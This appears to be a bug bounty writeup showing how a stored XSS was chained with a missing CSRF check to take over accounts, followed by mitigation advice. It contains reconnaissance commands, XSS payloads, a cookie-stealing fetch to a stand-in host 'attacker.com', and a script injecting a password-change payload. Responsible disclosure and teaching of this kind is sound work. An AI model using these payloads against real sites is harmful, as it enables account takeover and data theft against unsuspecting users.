---
title: "XSS to Account Takeover - Real World Example"
category: "Web"
difficulty: "Hard"
author: "havoc"
date: "2025-11-02"
description: "How we chained XSS with CSRF to achieve full account takeover on a production system"
---

## Summary

During a bug bounty engagement, we discovered a stored XSS vulnerability that could be chained with weak CSRF protection to achieve complete account takeover. This writeup details the exploitation process and lessons learned.

## Initial Reconnaissance

We started by enumerating the target application's attack surface:

```bash
# Subdomain enumeration
subfinder -d target.com -silent | httpx -silent | tee subdomains.txt

# Directory brute-forcing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -o dirs.txt
```

## Vulnerability Discovery

While testing the profile update functionality, we noticed that user input wasn't properly sanitized:

![Profile Update Form](/images/writeups/profile-form.jpg)

The application accepted HTML in the bio field:

```javascript
// Vulnerable code (from source)
function updateBio() {
    const bio = document.getElementById('bio').value;
    document.getElementById('preview').innerHTML = bio; // XSS HERE!
}
```

## Exploitation

### Step 1: XSS Proof of Concept

We crafted a simple XSS payload to test:

```html
<img src=x onerror="alert(document.domain)">
```

Success! The payload executed:

![XSS Alert Triggered](/images/writeups/xss-alert.jpg)

### Step 2: Stealing Session Tokens

Next, we crafted a payload to exfiltrate session cookies:

```javascript
<script>
fetch('https://attacker.com/collect?cookie=' + document.cookie);
</script>
```

However, the application used `HttpOnly` cookies, so this approach failed.

### Step 3: CSRF Chain

We discovered the password change endpoint lacked CSRF protection:

```python
#!/usr/bin/env python3
import requests

# Malicious payload to change victim's password
payload = """
<script>
// Change password via CSRF
fetch('/api/change-password', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        newPassword: 'hacked123',
        confirmPassword: 'hacked123'
    }),
    credentials: 'include'
}).then(response => {
    // Notify attacker
    fetch('https://attacker.com/notify?success=true');
});
</script>
"""

# Inject into bio
session = requests.Session()
session.post('https://target.com/api/profile', json={
    'bio': payload
})
```

### Step 4: Social Engineering

We sent the victim a link to view our "interesting profile":

```
https://target.com/profile/attacker123
```

When the victim visited, our XSS triggered and changed their password!

![Account Takeover Success](/images/writeups/xss-success.png)

## Impact

This vulnerability allows:
- ✅ Complete account takeover
- ✅ Access to sensitive user data
- ✅ Ability to perform actions as the victim
- ✅ Lateral movement to other accounts

**CVSS Score: 9.1 (Critical)**

## Timeline

```
2025-10-15: Vulnerability discovered
2025-10-16: Reported to vendor
2025-10-17: Vendor acknowledged  
2025-10-25: Fix deployed
2025-11-02: Public disclosure
```

## Mitigation

### For Developers

```javascript
// Proper input sanitization
import DOMPurify from 'dompurify';

function updateBio() {
    const bio = document.getElementById('bio').value;
    // Sanitize HTML before rendering
    const clean = DOMPurify.sanitize(bio);
    document.getElementById('preview').innerHTML = clean;
}
```

### For Security Teams

1. **Content Security Policy**: Implement strict CSP headers

```nginx
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

2. **CSRF Protection**: Add CSRF tokens to all state-changing requests

```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)
```

3. **Input Validation**: Never trust user input

```javascript
// Validate on both client and server
function validateBio(bio) {
    // Remove all HTML tags
    return bio.replace(/<[^>]*>/g, '');
}
```

## Lessons Learned

1. **Defense in Depth**: Multiple security layers would have prevented this
2. **HttpOnly Cookies**: Saved us from direct cookie theft
3. **CSRF Tokens**: Critical for sensitive operations
4. **Input Sanitization**: Must be done server-side
5. **Bug Bounty Programs**: Essential for finding these issues

## Proof of Concept Video

![XSS Exploitation Demo](/images/writeups/xss-demo.gif)

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Bounty Reward

💰 **$5,000** - Critical severity

---

**Difficulty Rating:** 🔴 Hard  
**Category:** Web Exploitation  
**Points:** 1000  
**Bounty:** $5,000

> **Note**: All screenshots and details have been sanitized to protect the vendor's identity. This disclosure follows responsible disclosure practices.
